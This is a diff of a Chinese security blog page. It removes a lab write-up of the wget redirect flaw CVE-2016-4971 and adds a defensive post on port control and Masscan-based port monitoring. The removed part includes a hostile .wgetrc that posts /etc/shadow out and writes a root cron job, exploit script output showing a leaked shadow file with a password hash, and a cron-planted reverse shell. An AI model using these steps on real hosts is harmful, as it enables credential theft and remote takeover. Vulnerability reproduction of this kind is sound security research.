@@ -6,36 +6,38 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://wismartzy.github.io">
-  <title>wget 重定向漏洞（CVE-2016-4971） | Wismartzy&#39;s Blog</title>
+  <title>不得不说的端口扫描 | Wismartzy&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="概述GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行CVE-2016-4971。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。
-验证环境
-webserver 10.0.97.225/192.168.1.148
-logserver 10.0.97.2">
+  <meta name="description" content="概述在做企业生产网络安全相关工作时，首先考虑的就是对服务器端口的管控。可以这么说，中小型企业如果能对服务器端口做严格管控，极大程度上缩小了攻击面，那么入侵事件会相应少很多，对处于救火阶段的安全建设起到立竿见影效果，有点四两拨千斤的味道，值得安全人员花心思在上面。
+开放端口大致上可以定下如下规则：
+
+非业务端口一概不对外开放
+
+
+可以在防火墙或其他网络设备上默认拒绝所有端口的（入/出）流量，然后再针">
 <meta property="og:type" content="article">
-<meta property="og:title" content="wget 重定向漏洞（CVE-2016-4971）">
-<meta property="og:url" content="http://wismartzy.github.io/2016/07/26/wget-redirection-vulnerability/index.html">
+<meta property="og:title" content="不得不说的端口扫描">
+<meta property="og:url" content="http://wismartzy.github.io/2017/02/19/port-scan/index.html">
 <meta property="og:site_name" content="Wismartzy's Blog">
-<meta property="og:description" content="概述GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行CVE-2016-4971。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。
-验证环境
-webserver 10.0.97.225/192.168.1.148
-logserver 10.0.97.2">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-2.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-3.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-1.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-4.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-5.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-6.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-7.png">
-<meta property="og:image" content="http://wismartzy.github.io/images/wget-8.png">
-<meta property="og:updated_time" content="2017-03-19T06:31:57.000Z">
+<meta property="og:description" content="概述在做企业生产网络安全相关工作时，首先考虑的就是对服务器端口的管控。可以这么说，中小型企业如果能对服务器端口做严格管控，极大程度上缩小了攻击面，那么入侵事件会相应少很多，对处于救火阶段的安全建设起到立竿见影效果，有点四两拨千斤的味道，值得安全人员花心思在上面。
+开放端口大致上可以定下如下规则：
+
+非业务端口一概不对外开放
+
+
+可以在防火墙或其他网络设备上默认拒绝所有端口的（入/出）流量，然后再针">
+<meta property="og:image" content="http://wismartzy.github.io/images/portscan.png">
+<meta property="og:updated_time" content="2017-03-19T07:25:54.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="wget 重定向漏洞（CVE-2016-4971）">
-<meta name="twitter:description" content="概述GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行CVE-2016-4971。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。
-验证环境
-webserver 10.0.97.225/192.168.1.148
-logserver 10.0.97.2">
-<meta name="twitter:image" content="http://wismartzy.github.io/images/wget-2.png">
+<meta name="twitter:title" content="不得不说的端口扫描">
+<meta name="twitter:description" content="概述在做企业生产网络安全相关工作时，首先考虑的就是对服务器端口的管控。可以这么说，中小型企业如果能对服务器端口做严格管控，极大程度上缩小了攻击面，那么入侵事件会相应少很多，对处于救火阶段的安全建设起到立竿见影效果，有点四两拨千斤的味道，值得安全人员花心思在上面。
+开放端口大致上可以定下如下规则：
+
+非业务端口一概不对外开放
+
+
+可以在防火墙或其他网络设备上默认拒绝所有端口的（入/出）流量，然后再针">
+<meta name="twitter:image" content="http://wismartzy.github.io/images/portscan.png">
   
     <link rel="alternative" href="/atom.xml" title="Wismartzy&#39;s Blog" type="application/atom+xml">
   
@@ -163,66 +165,56 @@ logserver 10.0.97.2">
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-wget-redirection-vulnerability" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-port-scan" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      wget 重定向漏洞（CVE-2016-4971）
+      不得不说的端口扫描
     </h1>
   
 
         
-        <a href="/2016/07/26/wget-redirection-vulnerability/" class="archive-article-date">
-  	<time datetime="2016-07-26T03:55:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-07-26</time>
+        <a href="/2017/02/19/port-scan/" class="archive-article-date">
+  	<time datetime="2017-02-19T03:40:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-19</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4971" target="_blank" rel="external">CVE-2016-4971</a>。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。</p>
-<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><blockquote>
-<p>webserver 10.0.97.225/192.168.1.148</p>
-<p>logserver 10.0.97.243/192.168.1.149</p>
-</blockquote>
-<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>在webserver上起了个nginx，nginx.conf里配置了一个302跳转，另外还起了一个ftp服务，监听21端口，<code>python -m pyftpdlib -p21 -w</code></p>
-<p><img src="/images/wget-2.png" alt="wget-2"></p>
-<p><img src="/images/wget-3.png" alt="wget-3"></p>
-<p>logserver上wget版本信息</p>
-<a id="more"></a>
-<p><img src="/images/wget-1.png" alt="wget-1"></p>
-<p>在机器（logserver）上使用wget发起对webserver的访问，从debug信息可以看到wget在遇到30x返回码的时候是不做任何验证就去请求FTP了。</p>
-<p><img src="/images/wget-4.png" alt="wget-4"></p>
-<p>ftp的log：</p>
-<p><img src="/images/wget-5.png" alt="wget-5"></p>
-<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>webserver上的/root/.bash_profile文件就被下载到了发起wget请求的logserver上了，而wget本来是想请求下载webserver上的safe-file.txt文件的。</p>
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h3 id="Cronjob"><a href="#Cronjob" class="headerlink" title="Cronjob"></a>Cronjob</h3><p>在webserver上准备好.wgetrc文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# cat .wgetrc</div><div class="line">post_file = /etc/shadow</div><div class="line">output_document = /etc/cron.d/wget-root-shell</div></pre></td></tr></table></figure>
-<p>假设现在有需求在服务器logserver上cron脚本每分钟去拉webserver的log文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*/1 * * * * root wget -N http://webserver/nginx-access.log &gt; /dev/null 2&gt;&amp;1</div></pre></td></tr></table></figure>
-<p>通过cron的日志可以看到job被执行了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Jul 13 18:54:02 logserver CROND[4161]: (root) CMD (wget -N http://webserver/safe-file.txt &gt; /dev/null 2&gt;&amp;1)</div></pre></td></tr></table></figure>
-<p>这个job是root用户执行的，所以去root家目录下查看是否已经有.wgetrc文件了</p>
-<p><img src="/images/wget-6.png" alt="wget-6"></p>
-<p>这里有点鸡肋的是如果该目录下已经存在.wgetrc文件，那么wget下载回来的.wgetrc文件将被重命名，就没法控制目标的下载行为了。</p>
-<p>既然上传了.wgetrc文件，接下来可以再深入点，反弹个shell试试：</p>
-<p>在webserver上运行exploit-db提供的exp脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# python wget_exp.py</div><div class="line">Ready? Is your FTP server running?</div><div class="line">FTP found open on 192.168.1.148:21. Let&apos;s go then</div><div class="line"></div><div class="line">Serving wget exploit on port 80...</div></pre></td></tr></table></figure>
-<p>从logserver上发起到webserver的请求，此时webserver上监听的端口开始有回显</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">We have a volunteer requesting /nginx-access.log by POST :)</div><div class="line"></div><div class="line">Received POST from wget, this should be the extracted /etc/shadow file:</div><div class="line"></div><div class="line">---[begin]---</div><div class="line"> root:$6$t8Pjy8CmXZGtsjRL$ZG.pnIDxJasLKzHA/lVR0GPlLezD1GbqVa1b3zYndE/j8jJbXbF03X8gc9AOcVkM.ZM2EYI2G7m3jCcY3QS/C.:16524:0:99999:7:::</div><div class="line">bin:*:16231:0:99999:7:::</div><div class="line">daemon:*:16231:0:99999:7:::</div><div class="line">adm:*:16231:0:99999:7:::</div><div class="line">lp:*:16231:0:99999:7:::</div><div class="line">sync:*:16231:0:99999:7:::</div><div class="line">shutdown:*:16231:0:99999:7:::</div><div class="line">halt:*:16231:0:99999:7:::</div><div class="line">mail:*:16231:0:99999:7:::</div><div class="line">operator:*:16231:0:99999:7:::</div><div class="line">games:*:16231:0:99999:7:::</div><div class="line">ftp:*:16231:0:99999:7:::</div><div class="line">nobody:*:16231:0:99999:7:::</div><div class="line">dbus:!!:16524::::::</div><div class="line">polkitd:!!:16524::::::</div><div class="line">avahi:!!:16524::::::</div><div class="line">avahi-autoipd:!!:16524::::::</div><div class="line">postfix:!!:16524::::::</div><div class="line">sshd:!!:16524::::::</div><div class="line">tcpdump:!!:16535::::::</div><div class="line">tss:!!:16545::::::</div><div class="line">user01:!!:16552:0:99999:7:::</div><div class="line">user02:!!:16553:0:99999:7:::</div><div class="line">nscd:!!:16566::::::</div><div class="line">nslcd:!!:16566::::::</div><div class="line">ntp:!!:16573::::::</div><div class="line">saslauth:!!:16575::::::</div><div class="line">mailnull:!!:16575::::::</div><div class="line">smmsp:!!:16575::::::</div><div class="line">www:!!:16653:0:99999:7:::</div><div class="line">mysql:!!:16653::::::</div><div class="line">td-agent:!!:16862::::::</div><div class="line">systemd-bus-proxy:!!:16874::::::</div><div class="line">systemd-network:!!:16874::::::</div><div class="line">unbound:!!:16874::::::</div><div class="line">ocserv:!!:16874::::::</div><div class="line">ossec:!!:16944:0:99999:7:::</div><div class="line">redis:!!:16957::::::</div><div class="line"></div><div class="line">---[eof]---</div><div class="line"></div><div class="line">Sending back a cronjob script as a thank-you for the file...</div><div class="line">It should get saved in /etc/cron.d/wget-root-shell on the victim&apos;s host (because of .wgetrc we injected in the GET first response)</div><div class="line">192.168.1.149 - - [13/Jul/2016 21:30:11] &quot;POST /nginx-access.log HTTP/1.1&quot; 200 -</div><div class="line"></div><div class="line">File was served. Check on /root/hacked-via-wget on the victim&apos;s host in a minute!</div></pre></td></tr></table></figure>
-<p>此时，在logserver上已经被写入了cron任务，每分钟执行一次的反弹shell任务</p>
-<p><img src="/images/wget-7.png" alt="wget-7"></p>
-<p>等待一分钟，cronjob执行，反弹shell成功</p>
-<p><img src="/images/wget-8.png" alt="wget-8"></p>
-<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方的修复方案为在调用从FTP下载文件的函数时多传了一个原始URL参数，在生成本地文件的文件名时使用了原始的URL所带的文件名，而不是使用跳转后FTP连接中的文件名了。具体修改部分可以从<a href="https://github.com/mirror/wget/commit/e996e322ffd42aaa051602da182d03178d0f13e1" target="_blank" rel="external">commit</a>上查看到。而我们用户要做的就是升级服务器上GNU wget版本至最新或1.18以上。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我发你一个链接，你敢wget吗？</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://www.exploit-db.com/exploits/40064/" target="_blank" rel="external">https://www.exploit-db.com/exploits/40064/</a></li>
-<li><a href="http://blog.nsfocus.net/wget-analysis-redirection-vulnerability-technology-protection-scheme/" target="_blank" rel="external">http://blog.nsfocus.net/wget-analysis-redirection-vulnerability-technology-protection-scheme/</a></li>
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在做企业生产网络安全相关工作时，首先考虑的就是对服务器端口的管控。可以这么说，中小型企业如果能对服务器端口做严格管控，极大程度上缩小了攻击面，那么入侵事件会相应少很多，对处于救火阶段的安全建设起到立竿见影效果，有点四两拨千斤的味道，值得安全人员花心思在上面。</p>
+<h1 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h1><p>大致上可以定下如下规则：</p>
+<ul>
+<li>非业务端口一概不对外开放</li>
 </ul>
+<blockquote>
+<p>可以在防火墙或其他网络设备上默认拒绝所有端口的（入/出）流量，然后再针对业务添加需要开放的端口，这样避免了管理工作上的混乱。</p>
+</blockquote>
+<ul>
+<li>管理端口必须经过内部统一认证登录，必要时可以加上二次验证。</li>
+</ul>
+<blockquote>
+<p>如果有堡垒机当然最好了，我在开发运维跳板机的过程就嵌入了 Google Authenticator 二次验证因子，使得员工登录服务器除了验证静态密钥外，还需要验证动态密码。</p>
+</blockquote>
+<ul>
+<li>对那些开放外网权限的服务，需要做深入的渗透测试。</li>
+</ul>
+<blockquote>
+<p>当然这并不能说要求渗透测试找出所有安全问题，这是不可能的，但是要保证不能携带高危漏洞上线，并且要求做到在收到安全告警时能迅速定位到问题，这才是最主要的。</p>
+</blockquote>
+<p>严格按照上面的规则执行，抵御一些脚本小子的恶意攻击还是绰绰有余的。</p>
+<a id="more"></a>
+<h1 id="监控管理"><a href="#监控管理" class="headerlink" title="监控管理"></a>监控管理</h1><p>制定了规则，如何及时发现遗漏或者错误呢？换句话说也就是如何来做端口状态监控这事情呢？有一款 HIDS 是通过定期在主机上执行 netstat 命令探测端口开放情况的，但在一般的互联网创业公司，考虑到成本和收益，这种 HIDS 在服务器上部署 Agent 的方式很少被采用，服务器上仅部署业务相关服务，部署 HIDS 显得过于臃肿了。</p>
+<p>在多人运维的环境中，iptables 规则被改错或者设错的情况时有发生，不知不觉高危端口就对外开放了（比如说 SSH，Redis 等），带来的后果十分严重，具体危害可以参考前段时间的（MongoDB）勒索事件以及前年（2015年）的<a href="http://wismartzy.github.io/2015/11/11/Redis-crackIT/"> Redis 事件</a>。</p>
+<p>除了规范 iptables 操作外，我们还能做的就是定期对公司 IP 资产做端口扫描，包括服务发现，如果探测是 HTTP 服务，则需要抓取 title 信息。为了提高扫描产出比，分两个任务执行，全端口扫描（次/周）和常规端口扫描（次/天）。全端口这里就不解释了，常规端口就是指一些企业常用到的端口，比如 SSH(22)，Rsync(873)，MySQL(3306)，8080…。这里推荐下猪猪侠的工具 <a href="https://github.com/ring04h/wyportmap" target="_blank" rel="external">Wyportmap</a>，自己拿来修改下是能满足需求的，工具原理就是利用 Python 的 libnmap 库调用 Nmap 扫描引擎对目标进行扫描。大家都知道 Nmap 这款工具，在端口扫描和服务发现上，该工具的确很赞，也是业内主推的安全渗透测试必备神器，但是 Nmap 有个最大的问题就是慢，当 IP 量上来后，全端口扫描太费时间，严重影响了扫描策略的执行，无法及时反馈端口状态信息，这就完全失去了监控的意义。后面经过调研，决定用 Masscan 替换 Nmap 扫描引擎，Masscan 号称最快的互联网端口扫描器，最快情况下可以在 6 分钟内扫遍互联网。能这么快完全是取决于其扫描方式，Masscan 的扫描并没进行完整的 TCP 三次握手，采用无状态扫描技术可以快速探测 IP 端口开放情况。另外它还支持自定义黑白名单，并可以根据自己情况设置扫描速率。关于 Masscan 的详细介绍可以看 <a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">Github</a></p>
+<h1 id="PortScan"><a href="#PortScan" class="headerlink" title="PortScan"></a>PortScan</h1><p>我用 Python 给 Masscan 包了一层，主要是解决 Masscan 对 Nmap-style IP 支持不怎么友好的问题，一言不合就改造成了方便使用的扫描工具了，当然其实也可以自己动手改 Masscan 源码，优化下扫描引擎的参数，再自行编译即可。 可以很方便的使用 Masscan 对给定的目标 IP 做端口扫描。<br>替换上 Masscan 扫描引擎后，同样的 IP 量，全端口扫描的时间缩短到分钟级别（能透露的就这么多了-.-!），反正就是很快啦。当然这个快也带来了相应的代价，就是在准确率上会有一些折扣。</p>
+<p>为了方便操作管理，为该扫描服务还开发了一套基于 Web 的系统 — PortScan，这里可以自定义扫描模板，并添加扫描任务，对每个扫描任务还可以设置定时任务，指定运行周期。</p>
+<p><img src="/images/portscan.png" alt="portscan"></p>
+<p>场景不单单适用于自己公司哦，比如我先定一个小目标，收集各大 SRC 厂商的 IP 列表，分别添加扫描任务并设置扫描周期，会有意想不到的效果。针对企业告警信息混乱，还添加了设置白名单功能，比如对一些已知的业务端口设置白名单，这样监控层面做到仅关注白名单外的情况，及时发现问题。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在一些中小互联网公司（安全人员有限）开展端口扫描工作还是很有必要的，尽量把攻击面缩小到已知范围，当然这也不是说企业就绝对安全了，这只是能缓解一些脚本小子的扫描攻击，面对黑客，要时常保持警惕，说不定他就在内网盯着你…</p>
 
       
 
@@ -236,7 +228,7 @@ logserver 10.0.97.2">
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CVE</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
         		</li>
       		
 		</ul>
@@ -292,7 +284,7 @@ logserver 10.0.97.2">
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://wismartzy.github.io/2016/07/26/wget-redirection-vulnerability/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://wismartzy.github.io/2017/02/19/port-scan/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -306,18 +298,9 @@ logserver 10.0.97.2">
   
 <nav id="article-nav">
   
-    <a href="/2016/08/21/OAuth-Security-Cheatsheet/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          OAuth Security Cheatsheet
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/07/15/MySQL-Order-By-Injection/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">MySQL Order By 注入</div>
+    <a href="/2016/09/27/how-codeigniter-do-CSRF-protection/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Codeigniter 是怎么做 CSRF 防御的</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -331,7 +314,7 @@ logserver 10.0.97.2">
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="wget-redirection-vulnerability" data-title="wget 重定向漏洞（CVE-2016-4971）" data-url="http://wismartzy.github.io/2016/07/26/wget-redirection-vulnerability/"></div>
+	<div class="ds-thread" data-thread-key="port-scan" data-title="不得不说的端口扫描" data-url="http://wismartzy.github.io/2017/02/19/port-scan/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
